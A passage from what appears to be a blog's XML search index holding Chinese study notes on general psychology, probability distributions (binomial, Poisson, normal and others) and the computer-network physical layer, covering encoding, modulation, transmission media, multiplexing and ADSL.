物理层:传输媒体为75Ω宽带同轴电缆. 数据率:1/5/10Mbps.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PSY-普通心理学-tips]]></title>
    <url>%2Fposts%2F6036618%2F</url>
    <content type="text"><![CDATA[loading... 证实偏差:人们容易注意那些能够证实自己想法的证据,而忽略那些与自己想法矛盾的证据.]]></content>
      <categories>
        <category>PSY</category>
      </categories>
      <tags>
        <tag>普通心理学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PSY-普通心理学-概览]]></title>
    <url>%2Fposts%2F83f4288b%2F</url>
    <content type="text"><![CDATA[心理学 心理学是一种研究行为和心理过程的科学,涉及大量领域,涵盖有关行为和心理过程的各个方面. 心理学大体可分为三个主要分支:实验心理学,心理学教学和应用心理学. 应用心理学专业:工业和组织心理学家,运动心理学家,工程心理学家,学校心理学家,康复心理学家,临床和咨询心理学家. 历史根源 现代心理学发源于几种互相冲突的学派,包括结构主义,功能主义,格式塔心理学,行为主义和精神分析. 结构主义:聚焦结构,科学心理学的建立. 功能主义:聚焦功能. 格式塔心理学:聚焦集体而非局部. 行为主义:消除精神意识,聚焦行为. 精神分析:聚焦潜意识. 结构主义 有两种具有革命性的思想塑造了早期心理学发展的进程. 达尔文的物种起源揭示了人与动物之间的关系,意味着可以将有关动物生理与行为的研究发现作为对人类行为研究的参考. 冯特基于化学元素产生的对意识基本元素的探索,也就是结构主义. 冯特是第一个自称为心理学家的人,并创建了一所进行心理学研究的学院,冯特与他的学生对他们所定义的意识的基本元素进行研究,包括:感觉,知觉,记忆,注意力,情绪,认知,学习和语言. 在实验中,他们让受训的志愿者接受各种简单的刺激,然后要求他们通过按压控制杆或通过描述感觉来对刺激做出反应,这种技术称为内省. 功能主义 詹姆斯认为,心理学不应该只研究意识的结构,还应该研究意识的功能.这被称为功能主义. 詹姆斯建议心理学应该研究人类是如何做到或者不能做到适应实验室以外日常生活的. 格式塔心理学 格式塔心理学家感兴趣的问题是我们如何构建"感知整体"(德语中为Gestalts),从而了解大脑是如何工作的.格式塔学派(或哲学学派)和结构主义,功能主义学者一样依靠内省的方法进行研究. 著名的格式塔心理学家马克斯魏特墨研究视觉错觉和诸如纳克立方体之类的图形,另一位沃尔夫冈科勒将格式塔心理学拓展到有关顿悟学习的研究. 纳克立方体证明了人们给自己的感觉赋予了含义,这个过程就叫做感知,这意味着人们并不是简简单单地感觉这个世界,还会通过加入自己的解释来感知这个世界. 行为主义 行为主义者认为意识根本不应该成为心理学的研究对象.约翰华生是行为主义运动的领袖,他认为,如果心理学想要成为一门真正的,客观的科学,那就应该仅仅研究能够被观察到的事物,即来自环境的刺激和有机体的反应.心理学应该是行为的科学,而不是精神意识的科学. 行为主义摒弃任何涉及主观心理过程的心理学.行为主义者特别反对内省,他们不关注人们在想什么,而是关注人们会做什么. 精神分析 弗洛伊德和他的学生们发明了精神分析法来治疗心理障碍,他们的概念性视角叫做精神分析,他们认为精神障碍是由潜意识的冲突造成的,因此他们坚持心理学研究应该覆盖潜意识. 心理学家的视角 现代心理学以七种重要的观点为主要特征:生物学观点,发展观点,认知观点,临床观点,行为主义观点,特质观点和社会文化观点. 生物学观点 生物学观点强调生理结构和脑部活动对人格,偏好,行为方式和能力的影响. 采用生物学方法的心理学家会在遗传,神经系统,内分泌系统以及注入疾病这样的环境攻击(而非人身攻击)等方面寻找行为的原因. 将生物心理学和生物学,神经学和其他研究脑内过程的学科一并叫做神经科学. 生物学观点的一个重要变种就是进化心理学,进化心理学认为人类的许多特质来自人类遥远祖先的遗传特性. 发展观点 发展观点认为心理变化是由基因设定的遗传特性与外部环境之间的相互作用共同产生的,问题在于这个过程中谁影响更大. 发展心理学家研究人们随着年龄的增长如何变化,如何培养社会技能,学习与融入文化等. 认知观点]]></content>
      <categories>
        <category>PSY</category>
      </categories>
      <tags>
        <tag>普通心理学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Math-probability-theory-随机变量及其分布]]></title>
    <url>%2Fposts%2Fcf5a0360%2F</url>
    <content type="text"><![CDATA[前言 随机试验的结果未必是数量的,为了数学处理的方便以及理论研究的需要,将随机试验的结果与实数对应起来,引入随机变量的概念. 随机变量作一个从样本空间到实数集的映射(函数),使样本从语言描述变成实数变量,从而将实验结果数量化. 针对实践中人们关心随机变量落入某个区间的概率,定义了分布函数的概念. 由分布函数的连续积分表达式定义出连续型随机变量的概率密度,使概率的求解转化为概率密度的定积分的计算. 随机变量 设随机试验\(E\)的样本空间是\(S\),若对于每一个\(e\)属于\(S\),有一个实数\(X(e)\)与之对应,即\(X(e)\)是定义在\(S\)上的单值实函数,也称为随机变量(简记为\(r.v.\)).可用随机变量\(X\)描述事件. 随机变量随着试验的结果而取不同的值,在试验之前不能确切知道它取什么值,但是随机变量的取值有一定的统计规律性,即概率分布. 随机变量可分为离散型随机变量和非离散型随机变量. 离散型随机变量及其分布律 若随机变量全部可能取到的值是有限多个或可列无限多个(即可数集,指能与自然数集\(N\)一一对应的集合),则称为离散型随机变量. 设离散型随机变量\(X\)所有可能取值为\(x_k\)(\(k = 1, 2, \cdots\)),\(P(X = x_k) = p_k\)(\(k = 1, 2, \cdots\)). 任意\(p_k\)大于等于\(0\)且所有\(p_k\)之和为\(1\). \(P(X = x_k) = p_k\)(\(k = 1, 2, \cdots\))为离散型随机变量\(X\)的概率分布(律)或分布律. 概率分布或分布律也可以用表格表示. X \(x_1\) \(x_2\) \(\cdots\) \(x_n\) \(\cdots\) \(P(X = x_k)\) \(p_1\) \(p_2\) \(\cdots\) \(p_n\) \(\cdots\) 退化分布 \(X\)服从退化分布:若\(P(X = c) = 1\). 0-1分布 设随机试验\(E\)有两种可能的结果:\(S = \{e_1, e_2\}\),设随机变量\(X\): \[ X = X(e) = \begin{cases} &amp;1, 当e = e_1\\ &amp;0, 当e = e_2\\ \end{cases} \] 分布律为\(P\{x = k\} = p^k(1 - p)^{1-k}, k = 0, 1\).称\(X\)服从\(0-1\)分布.记为\(X \sim 0-1(p)\)或\(X \sim B(1, p)\). 二项分布 设试验\(E\)只有两个可能结果\(A\)与\(\overline{A}\),则称\(E\)为伯努利试验. 设\(P(A) = p(0 &lt; p &lt; 1)\),将试验\(E\)独立重复地进行\(n\)次,这样的试验称为\(n\)重伯努利实验. 一般地有\(P\{X = k\} = C^k_np^k(1-p)^{n-k},k=0,1,\cdots,n\). 称\(X\)服从参数为\(n,p\)的二项分布,记为\(X \sim b(n,p)\). 当\(n=1\)时,\(P\{X=k\}=p^k(1-p)^{1-k},k=0,1,\)即为\(0-1\)分布. 当\(n\)较大,\(p\)又较小时,二项分布的计算比较困难,可以用\(Poisson\)分布近似计算. 泊松分布 若\(X\)的分布为\(P\{X=k\}=\frac{\lambda^ke^{-\lambda}}{k!},k=0,1,\cdots\). 其中\(\lambda&gt;0\)是常数,则称\(X\)服从参数为\(\lambda\)的泊松分布.记为\(X \sim \pi(\lambda)\). \(\sum_{k=0}^\infty P\{X=k\} = \sum_{k=0}^\infty \frac{\lambda^ke^{-\lambda}}{k!} = e^{-\lambda}\sum_{k=0}^\infty\frac{\lambda^k}{k!} = e^{-\lambda}e^{\lambda} = 1\). 如果某事件以固定强度\(\lambda\),随机且独立地出现,该事件在单位时间出现的次数可以看成是服从泊松分布. 泊松(\(Poisson\))定理. 设随机变量序列\(\{X_n\}\),\(X_n \sim b(n,p_n)\),则 \(\lim_{n \to \infty}P\{X_n = k\}=\lim_{n \to \infty}\left( n \choose k \right)p^k_n(1-p_n)^{n-k}=\frac{\lambda^ke^{-\lambda}}{k!}\). 其中\(np_n = \lambda &gt; 0\),\(k\)为任一非固定的非负整数. 在定理的条件下,二项分布的极限分布是泊松分布.可以利用泊松分布近似计算二项分布. 一般当\(n \ge 20,p \le 0.05\)时,近似效果较好. 几何分布 进行重复独立试验,设每次试验成功的概率为\(p\),失败的概率为\(q\)(等于\(1 - p\)),\((0 &lt; p &lt; 1)\). 将试验进行到出现一次成功为止,以\(X\)表示所需的试验次数,则\(X\)的分布律为:\(P\{X = k\} = q^{k - 1}p\),\(k = 1, 2, \cdots\).称为\(X\)服从参数为\(p\)的几何分布. 若\(X\)的概率分布律为 \(P(X=k)=p(1-p)^{k-1},k=1,2,3,\cdots\). 其中\(0 &lt; p &lt; 1\),称\(X\)服从参数为\(p\)的几何分布,记为\(X \sim Geom(p)\). 随机变量的分布函数 对于非离散型\(r.v.\),不能用分布律来描述它,需要考虑\(r.v.\)的取值落入一个区间的概率.如:\(P\{X &lt;= x\}\),\(P\{x1 &lt;= X &lt;= x2\}\).为此引入随机变量的分布函数. 定义:设随机变量\(X\),\(x\)为任意实数,则\(F(x) = P\{X &lt;= x\}\)称为\(X\)的分布函数. 分布函数可以给出随机变量落入任意一个范围的可能性. \(X\)的分布函数\(F(x)\),\(a,b\)为两个实数,\(a &lt; b\),则 \[ \begin{align} &amp;P(a &lt; X \le b) = P(X \le b) - P(X \le a) = F(b) - F(a)\\ &amp;P(a &lt; X &lt; b) = F(b-0) - F(a)\\ &amp;P(X = b) = P(X \le b) - P(X &lt; b) = F(b) - F(b-0)\\ &amp;P(a &lt; X &lt; b) = P(a &lt; X \le b) - P(X = b)\\ \end{align} \] 无论是离散型\(r.v.\)还是非离散型\(r.v.\),分布函数都可以描述其统计规律性. 随机变量的分布函数性质. 单调不减性:\(F(x)\)是单调不减函数. 规范性:\(0 &lt;= F(x) &lt;= 1\),\(F(-\infty) = 0\),\(F(+\infty) = 1\). 右连续性:\(F(x)\)至多有可列个间断点,而在其间断点上也是右连续的,\(F(x + 0) = F(x)\). 重要公式. \(P\{a &lt; X &lt;= b\} = F(b) - F(a)\). \(P\{X &gt; a\} = 1 - F(a)\). \(P\{X = a\} = F(a + 0) - F(a - 0)\). 易知离散型随机变量的分布函数是阶梯函数. 连续型随机变量及其概率密度 对于随机变量\(X\)的分布函数\(F(x)\),存在非负函数\(f(x)\),使得对于任意的实数\(x\),有 \(F(x) = \int_{-\infty}^{x}f(t)\mathrm{d}t\). 则称\(X\)为连续型\(r.v.\),\(f(x)\)称为\(X\)的概率密度函数,简称概率密度.连续型随机变量的分布函数是连续函数. 概率密度函数性质 \(f(x) \ge 0\). \(\int_{-\infty}^{+\infty}f(x)\mathrm{d}x = 1\). \(P\{x_1 \le X \le x_2\} = F(x_2) - F(x_1) = \int_{x_1}^{x_2}f(x)\mathrm{d}x,(x_1 \le x_2)\). 若\(f(x)\)在点\(x\)处连续,则有\(F\prime(x) = f(x)\). \[ \begin{align} f(x) &amp;= \lim_{\Delta x \to 0^+}\frac{F(x + \Delta x) - F(x)}{\Delta x}\\ &amp;= \lim_{\Delta x \to 0^+}\frac{P\{x &lt; X \le x + \Delta x\}}{\Delta x}\\ \end{align} \] 上式可知当\(\Delta x\)很小时,有\(P\{x &lt; X &lt; x + \Delta x\} \approx f(x)\). 关于连续型r.v.的几个重要结论 设\(X\)为连续型\(r.v.\),\(X\)取任一指定的实数值\(a\)的概率均为\(0\).即\(P\{X = a\} = 0\). 计算连续随机变量在一段区间上的概率时,可以不必区分是开区间还是闭区间,求概率密度函数时也是如此. 一般提到一个随机变量的概率分布时,指的是分布函数.或者:当是离散随机变量时,指的是分布律;当是连续随机变量时,指的是其概率密度. 概率密度本身不代表概率,代表的是某区间的概率的大小关系,所以概率密度的值可以大于\(1\). 几个常用的连续型r.v.分布 均匀分布 设随机变量\(X\)在区间\([a,b]\)上取值,且概率密度为: \[ f(x) = \begin{cases} \frac{1}{b-a},a &lt; x &lt; b,\\ 0, 其它\\ \end{cases} \] 则称随机变量\(X\)在\((a,b)\)上服从均匀分布,记作\(X \sim U(a,b)\). 若\(X \sim U(a,b)\),区间\((c,c+l) \subset (a,b)\),则\(P\{c &lt; X &lt; c + l\} = \int_{c}^{c + l}\frac{1}{b-a}\mathrm{d}x = \frac{l}{b-a}\). 分布函数. \[ F(x) = \begin{cases} 0, x &lt; a,\\ \frac{x-a}{b-a}, a \le x &lt; b,\\ 1, x \ge b.\\ \end{cases} \] 指数分布 定义:如果连续性随机变量\(X\)的概率密度为: \[ f(x) = \begin{cases} \frac{1}{\theta}e^{-\frac{x}{\theta}},x \ge 0,\theta &gt; 0\\ 0, x &lt; 0,\\ \end{cases} \] 则称\(X\)服从参数为\(\theta\)的指数分布. 指数分布具有无记忆性:\(P(X&gt;s+t|X&gt;s)=P(X&gt;t)\). 指数分布概率密度的又一种表示. \[ f(x) = \begin{cases} \lambda e^{-\lambda x},x \ge 0,\lambda &gt; 0\\ 0, x &lt; 0,\\ \end{cases} \] 分布函数为: \[ F(x) = \begin{cases} 1 - e^{-\lambda x}, x &gt; 0,\\ 0, x \le 0.\\ \end{cases} \] 指数分布可用来表示:独立随机事件发生的时间间隔;排队论中一个顾客接受服务的时间长短;无记忆性的连续现象. 伽玛分布 定义:如果连续型随机变量\(X\)的概率密度为: \[ f(x) = \begin{cases} \frac{\beta^\alpha}{\Gamma(\alpha)}x^{\alpha - 1}e^{-\beta x},x &gt; 0\\ 0, x \le 0,\\ \end{cases} \] 其中,\(\beta &gt; 0,\alpha &gt; 0\)为参数,伽玛函数为:\(\Gamma(\alpha) = \int_{0}^{+\infty}x^{\alpha-1}e^{-x}{d}x\). 则称\(X\)服从伽玛分布,简记\(X \sim \Gamma(\alpha, \beta)\).特别的:\(\Gamma(1, \beta)\)是参数为\(\beta\)的指数分布. 伽玛函数性质: \(\Gamma(\alpha + 1) = \alpha \Gamma(\alpha)\). 对于正整数n,\(\Gamma(n + 1) = n!\). \(\Gamma(\frac{1}{2}) = \sqrt{\pi}\). 正态分布 若随机变量\(X\)概率密度为: \(f(x) = \frac{1}{\sqrt{2\pi}\sigma}e^{-\frac{(x-\mu)^2}{2\sigma^2}},-\infty &lt; x &lt; + \infty\). 其中\(\mu,\sigma(\sigma &gt; 0)\)为常数,则称\(X\)服从参数为\(\mu,\sigma\)的正态分布,记作\(X \sim N(\mu,\sigma^2)\). 分布函数\(F(x) = \frac{1}{\sqrt{2\pi}\sigma}\int_{-\infty}^{x}e^{-\frac{(t-\mu)^2}{2\sigma^2}}{d}t\). 正态分布的用途:人的生理尺寸,医学检验指标. 若\(Z \sim N(0,1)\),称\(Z\)服从标准正态分布. \(Z\)的概率密度函数:\(\varphi(z) = \frac{1}{\sqrt{2\pi}}e^{-\frac{z^2}{2}}\). \(Z\)的分布函数:\(\phi(z) = \frac{1}{\sqrt{2\pi}}\int_{-\infty}^{z}e^{-\frac{t^2}{2}}{d}t\). 正态分布(也称为高斯分布,误差分布)的性质. \(\mu\)--位置参数,\(f(x)\)的图形关于\(x = \mu\)对称. \(\sigma\)--影响\(f(x)\)的曲线的最大值\(f_max = \frac{1}{\sqrt{2\pi}\sigma}\)及图形的形状拐点(\(x \pm \sigma,f(x \pm \sigma)\)). 若\(X \sim N(\mu,\sigma^2)\),则\(Z = \frac{X - \mu}{\sigma} \sim N(0,1)\). \(\phi(-x) + \phi(x) = 1 \Rightarrow \phi(-x) = 1 - \phi(x) \Rightarrow \phi(x) - \phi(-x) = 2\phi(x) - 1\). 服从正态分布\(N(\mu,\sigma^2)\)的随机变量\(X\)的值几乎全部落入\([\mu - 3\sigma,\mu + 3\sigma]\)内,称为\(3\sigma\)原则. 通过标准正态分布计算其它一切正态分布的概率. 性质:当\(X \sim N(\mu,\sigma^2)\)时,\(\frac{X - \mu}{\sigma} \sim N(0,1)\). 证明:对于任意的实数\(z\). \(P(\frac{X-\mu}{\sigma}\le z) = P(X\le\sigma z + \mu) = \int_{-\infty}^{\sigma z + \mu}\frac{1}{\sqrt{2\pi}\sigma}e^{-\frac{(t-\mu)^2}{2\sigma^2}}{d}t\). 令\(s = \frac{t - \mu}{\sigma}\),则\(\frac{(t - \mu)^2}{2\sigma^2} = \frac{s^2}{2},{d}s = \frac{1}{\sigma}{d}t\). 原式\(=\int_{-\infty}^{z} \frac{1}{\sqrt{2\pi}}e^{-\frac{s^2}{2}}{d}s = \phi(z)\). 由此可知,当\(X \sim N(\mu,\sigma^2)\)时,对于任意实数\(a\),\(F_X(a)=P(X \le a)=P(\frac{X - \mu}{\sigma} \le \frac{a - \mu}{\sigma})=\phi(\frac{a - \mu}{\sigma})\). 设\(X \sim N(0,1)\),若\(z_{\alpha}\)满足\(P{X &gt; z_{\alpha}} = \alpha,0 &lt; \alpha &lt; 1\).则称点\(z_{\alpha}\)为标准正态分布的上\({\alpha}\)分位点. 随机变量的函数的分布 由已知的\(r.v.X\)的分布,去求得它的函数\(Y = g(X)\)的分布(\(g(.)\)是已知的连续函数). 若\(X\)为离散型随机变量,则先写出Y的可能取值:\(y_1,y_2,\cdots,y_j,\cdots\).再找出\(\{Y = y_j\}\)的等价事件{X D},则\(P(Y = y_j) = P(X \in D)\). 若\(X\)为连续型随机变量,先根据\(X\)的取值范围,给出\(Y\)的取值范围.然后写出\(Y\)的概率分布函数:\(F_Y(y) = P(Y \le y)\),找出\(\{Y \le y\}\)的等价事件\(\{X \in D\}\),得\(F_Y(y) = P(X \in D)\);再求出\(Y\)得概率密度函数\(f_Y(y)\). 定理:设随机变量\(X \sim f_X(x), -\infty &lt; x &lt; +\infty\),\(Y = g(X),g\prime(x) &gt; 0(g\prime(x) &lt; 0)\). 则\(Y\)具有概率密度为: \[ f_Y(y) = \begin{cases} f_X(h(y))\cdot|h\prime(y)|, \alpha &lt; y &lt; \beta\\ 0, 其他,\\ \end{cases} \] \((\alpha,\beta)\)是\(Y\)的取值范围,其中:\(\alpha = g(-\infty),\beta = g(+\infty)\)(若\(g\prime(x) &lt; 0\),则反过来). \(h\)是\(g\)的反函数,即\(h(y) = x \Leftrightarrow y = g(x)\). 一般的,若随机变量\(X \sim N(\mu,\sigma^2)\),则有\(Y = aX + b \Rightarrow Y \sim N(a\mu + b,a^2\sigma^2)\).]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-computer-network-物理层]]></title>
    <url>%2Fposts%2Fc5ff560c%2F</url>
    <content type="text"><![CDATA[基本概念 物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流,物理层的作用是要尽可能地屏蔽掉不同传输媒体和通信手段的差异.物理层的协议也常称为物理层规程. 物理层所规定的传输媒体的四个特性. 机械特性:规定了DTE和DCE之间的连接方式,说明接口所用接线器的形状和尺寸,引线数目和排列等. 电气特性:规定了DTE和DCE之间接口电路上信号发生器与接收器之间的电气特性. 功能特性:规定了DTE和DCE之间包括数据传送,控制,定时和接地等几类引线的功能. 规程特性:规定了DTE和DCE之间接口电路所使用的规程,即信号时序的应答关系和操作过程的规则. DTE是数据终端设备,也就是具有一定的数据处理能力以及发送和接收数据能力的设备;数据电路端设备DCE的作用就是在DTE和传输线路之间提供信号变换和编码的功能,负责建立,保持和释放数据链路的连接. 数据通信基础 数据:运送消息的实体. 信号:数据的电气的或电磁的表现. 模拟信号:代表消息的参数的取值是连续的. 数字信号:代表消息的参数的取值是离散的. 码元:指在使用时间域(时域)的波形表示数字信号时代表不同离散数值的基本波形.在数字通信中,一个数字脉冲称为一个码元.使用单位时间内载波调制状态改变次数来表示.数字信号的基本单位称为码元. 模拟信号与数字信号经常相互转化,现实中采集的是模拟信号,转化为数字信号交由计算机处理. 信道 信道:一般用来表示向某一个方向传送信息的媒体. 单向通信(单工通信):只能有一个方向的通信而没有反方向的交互. 双向交替通信(半双工通信):通信的双方都可以发送信息,但不能双方同时发送(当然也就不能同时接收). 双向同时通信(全双工通信):通信的双方可以同时发送和接收信息. 基带信号(即基本频带信号):来自信源的信号,像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号. 基带调制:仅对基带信号的波形进行变换,使它能够与信道特性相适应.变换后的信号仍然是基带信号,这种过程称为绸码. 带通调制:使用载波进行调制,把基带信号的频率范围搬移到较高的频段,并转换为模拟信号,这样就能够更好地在模拟信道中传输(即仅在一段频率范围内能够通过信道). 带通信号:经过载波调制后的信号. 编码 承载比特的信号在两个端系统适配器(也称网卡)之间的传输媒体上传输,为使信道有效传输和接收结点有效识别,先要将比特编码为信号,再传输.不同编码方式主要看信号时钟同步和编码效率. 不归零制:正电平代表1,负电平代表0. 归零制:正脉冲代表1,负脉冲代表0. 曼彻斯特编码:位周期中心的向上跳变代表0,位周期中心的向下跳变代表1,但也可反过来定义. 差分晏彻斯特编码:在每一位的中心处始终都有跳变,位开始边界有跳变代表0,而位开始边界没有跳变代表1. 曼彻斯特编码和差分曼彻斯特编码产生的信号频率比不归零制高;从自同步能力来看,不归零制不能从信号波形本身中提取信号时钟频率(没有自同步能力),而曼彻斯特编码和差分晏彻斯特编码具有自同步能力. 带通调制方法 基带信号往往包含有较多的低频成分,甚至有直流成分,而许多信道并不能传输这种低频分量或直流分量,因此必须对基带信号进行调制.最基本的二元制调制方法有以下几种. 调幅(AM):载波的振幅随基带数字信号而变化. 调频(FM):载波的频率随基带数字信号而变化. 调相(PM):载波的初始相位随基带数字信号而变化. 为了达到更高的信息传输速率,必须采用技术上更为复杂的多元制的振幅相位混合调制方法:正交振幅调制QAM. 图例可供选择的相位有12种,而对于每一种相位有1或2种振幅可供选择,总共有16种组合(对应四个比特),即16个码元.可以看出每个码元可以用一组极坐标来描述.码元不是越多越好,若每一个码元可表示的比特数越多,则在接收端进行解调时要正确识别每一种状态就越困难,出错率增加. 信道的极限容量 任何实际的信道都不是理想的,在传输信号时会产生各种失真以及带来多种干扰.码元传输的速率越高,或信号传输的距离越远,或传输媒体质量越差,在信道的输出端的波形的失真就越严重. 限制码元在信道上的传输速率(单位为波特,Baud,1波特为每秒传送1个码元)的因素. 信道能够通过的频率范围:具体的信道所能通过的频率范围总是有限的,信号中的许多高频分量往往不能通过信道. 信噪比. 在任何信道中,码元传输的速率是有上限的,否则就会出现码间串扰的问题,使接收端对码元的判决(即识别)成为不可能.任何实际的信道所能传输的最大数据传输速率受到奈奎斯特(Nyquist)公式限制.信道带宽W范围从0开始的(0-W),称为低通信道,不从0开始的称为带通信道. 理想低通信道的最高码元传输速率:2W Baud. 理想带通信道的最高码元传输速率:W Baud. 如果信道的频带越宽,也就是能够通过的信号高频分量多,那么就可以用更高的速率传送码元而不出现码间串扰.每码元的信息量越多,信道传输速率就越快. 物理层下面的传输媒体 传输媒体也称为传输介质或传输媒介,它就是数据传输系统中在发送器和接收器之间的物理通路.传输媒体可分为两大类,即导引型传输媒体和非导引型传输媒体. 在导引型传输媒体中,电磁波被导引沿着固体媒体(铜线或光纤)传播. 非导引型传输媒体就是指自由空间.在非导引型传输媒体中,电磁波的传输常称为无线传输. 导引型传输媒体 双绞线 双绞线是最常用的传输媒体,可用于模拟传输和数字传输,通信距离一般为几到十几公里.分为屏蔽双绞线STP和无屏蔽双绞线UTP.EIA/TIA-568-A标准规定了5种UTP标准(从1类线到5类线),对传送数据来说,现在最常用的UTP是5类线(Category 5或CAT5). 双绞线标准.10Base-T中10是指数据传输速率10Mbps.Base是指基带,T表示双绞线,指用于该网络的电缆. 同轴电缆 同轴电缆具有很好的抗干扰特性,被广泛用于传输较高速率的数据,同轴电缆的带宽取决于电缆的质量. 50欧姆同轴电缆:LAN/数字传输常用. 75欧姆同轴电缆:有线电视/模拟传输. 光纤 光纤是光纤通信的传输媒体,由于可见光的频率非常高,约为10^8MHz,因此一个光纤通信系统的传输带宽远远大于目前其他各种传输媒体的带宽.光纤传输系统的组成部分:光纤,光源,检测器. 当光线从高折射率的媒体射向低折射率的媒体时,其折射角将大于入射角.因此,如果入射角足够大,就会出现全反射,光也就沿着光纤传输下去,光线在纤芯中传输的方式是不断地全反射.双向传输需两根光纤. 多模光纤:可以存在多条不同角度入射的光线在一条光纤中传输. 单模光纤:光纤的直径减小到只有一个光的波长,则光纤就像一根波导那样,它可使光线一直向前传播,而不会产生多次反射. 光纤通信常用的三个波段的中心分别位于850nm,1300nm和1550nm.所有这三个波段都具有25000-30000GHz的带宽.光纤的优点:通信容量非常大;传输损耗小,中继距离长;抗雷电和电磁干扰性能好;无串音干扰,保密性好;体积小,重量轻. 非导引型传输媒体 将自由空间称为非导引型传输媒体,无线传输所使用的频段很广. 短波通信(即高频通信)主要是靠电离层的反射,但短波信道的通信质量较差,传输速率低;微波在空间主要是直线传播,传统微波通信有两种方式,地面微波接力通信和卫星通信. 无线局域网:要使用某一段无线电频谱进行通信,通常必须得到本国政府有关无线电频谱管理机构的许可证.有一些无线电频段是可以自由使用的,例如ISM,各国的ISM标准有可能略有差别. 红外线 红外线是一种点对点的数据传输协议,是传统的设备之间连接线缆的替代,通讯距离一般在0到1米之间,传输速率最快可达16Mbps,波长为900纳米左右. 缺点:通讯距离短,通讯过程中不能移动,遇障碍物通讯中断,SIR标准通讯速率较低(115.2kbit/s).其主要目的是取代线缆连接进行无线数据传输,功能单一,扩展性差. 应用:笔记本电脑,台式电脑和手持电脑;打印机,键盘鼠标等计算机外围设备;电话机,移动电话,数码相机,计算器,游戏机,机顶盒,手表;工业设备和医疗设备. 信道复用技术 复用即允许用户使用一个共享信道进行通信,从而降低成本,提高利用率. 实例 频分复用FDM:将整个带宽分为多份,用户在分配到一定的频带后,在通信过程中自始至终都占用这个频带.频分复用的所有用户在同样的时间占用不同(频率)的带宽资源. 时分复用TDM:将时间划分为一段段等长的时分复用帧(TDM帧),每一个时分复用的用户在每一个TDM帧中占用固定序号的时隙.每一个用户所占用的时隙周期性地出现.TDM信号也称为等时信号.时分复用的所有用户在不同的时间占用同样的频带宽度. 统计时分复用STDM:STDM帧不是固定分配时隙,而是按需动态地分配时隙. 波分复用WDM:即光的频分复用. 码分复用 码分复用CDM,也称为码分多址CDMA,用于无线广播信道中,如蜂窝,卫星. 各用户使用经过特殊挑选的不同码型,同频,同时使用,彼此干扰很小.这种系统发送的信号有很强的抗干扰能力,其频谱类似于白噪声,不易被敌人发现. 码片序列:每一个比特时间划分为m个短的间隔,称为码片(chip),每个站被指派一个唯一的m bit码片序列. 如发送比特1,则发送该码片序列. 如发送比特0,则发送该码片序列的二进制反码. 假定S站要发送信息的数据率为b bit/s,由于每一个比特要转换成m个比特的码片,因此S站实际上发送的数据率提高到mb bit/s,同时S站所占用的频带宽度也提高到原来数值的m倍.这种通信方式是扩频通信中的一种.扩频通信通常有两类:直接序列扩频DSSS,码片序列就是这一类;跳频扩频FHSS. 每个站分配的码片序列不仅必须各不相同，并且还必须互相正交,令向量S表示站S的码片向量(0011对应向量(-1 -1 1 1)),令T表示其他任何站的码片向量.两个不同站的码片序列正交就是向量S和T的规格化内积为0.而任何一个码片向量和该码片向量自己的规格化内积都是1,一个码片向量和该码片反码的向量的规格化内积值是-1. 数字传输系统 时分复用PCM 脉码调制PCM技术将模拟信号转变为数字信号,PCM先对模拟信号进行采样,这里存在一个采样定理:要不失真的还原原始信号,采样频率不能低于信号最高频率的2倍. 电话信号的例子:最高频率为3.4kHz,采样频率要大于6.8kHz,采样的标准定为8kHz,即采样周期为125µs, 每次采样,获得8bit,PCM信号的基本速率为64kbps. PCM有两个互不相容的国际标准:北美的24路PCM(简称为T1),欧洲的30路PCM(简称为E1).我国采用的是欧洲的E1标准.E1时分复用帧的构成:每时隙8bit,32路共用256bit,每秒传送8000个帧,PCM E1一次群的数据率就是2.048Mbps,可再次复用,支持传输更高的数据率.北美使用的T1系统共有24路,速率1.544Mbps. 同步光纤网SONET与SDH 同步光纤网SONET的各级时钟都来自于一个非常精准的主时钟.SONET为光纤传输系统定义了同步传输的线路速率等级结构.对电信号称为第1级同步传送信号STS-1,其传输速率是51.84Mbit/s.对光信号则称为第1级光载波OC-1.现已定义了从51.84Mbit/s(即OC-1)一直到9953.280Mbit/s(即OC-192/STS-192)的标准. ITU-T以美国标准SONET为基础,制订出国际标准同步数字系列SDH,可认为SDH与SONET是同义词.SDH基本速率为155.52Mbit/s,称为第1级同步传递模块STM-1,相当于SONET体系中的OC-3速率. SONET/SDH标准的意义:使不同的数字传输体制在STM-1等级上获得了统一,第一次真正实现了数字传输体制上的世界性标准,已成为公认的新一代理想的传输网体制,SDH标准也适合千微波和卫星传输的技术体制. 宽带接入技术 用户要连接到互联网,必须先连接到某个ISP,在互联网的发展初期,用户都是利用电话的用户线通过调制解调器连接到ISP的,电话用户线接入到互联网的速率最高仅达到56 kbit/s. 从宽带接入的媒体来看,可以划分为两大类:有线宽带接入,无线宽带接入. 非对称数字用户线ADSL 非对称数字用户线ADSL技术就是用数字技术对现有的模拟电话用户线进行改造,使它能够承载宽带业务. 标准模拟电话信号的频带被限制在300-3400Hz的范围内,但用户线本身实际可通过的信号频率仍然超过1MHz.ADSL技术把0-4kHz低端频谱留给传统电话使用,而把原来没有被利用的高端频谱留给用户上网使用. 数字用户线DSL的类型:ADSL非对称数字用户线,HDSL高速数字用户线,SDSL一对线的数字用户线,VDSL甚高速数字用户线,DSL数字用户线,RADSL速率自适应数字用户线,是ADSL的一个子集,可自动调节线路速率. ADSL的传输距离取决于数据率和用户线的线径(用户线越细,信号传输时的衰减就越大).ADSL所能得到的最高数据传输速率与实际的用户线上的信噪比密切相关. ADSL的特点:上行和下行带宽是不对称的,上行指从用户到ISP,下行指从ISP到用户.ADSL在用户线的两端各安装一个ADSL调制解调器. 离散多音调(多子信道)DMT调制技术. DMT调制技术采用频分复用的方法把,40kHz以上一直到1.1MHz的高端频谱划分为许多子信道,其中25个子信道用于上行信道,249个子信道用于下行信道.每个子信道占据4kHz带宽(4.3125kHz)并使用不同的载波进行数字调制.这种做法相当于在一对用户线上使用许多小的调制解调器并行地传送数据. 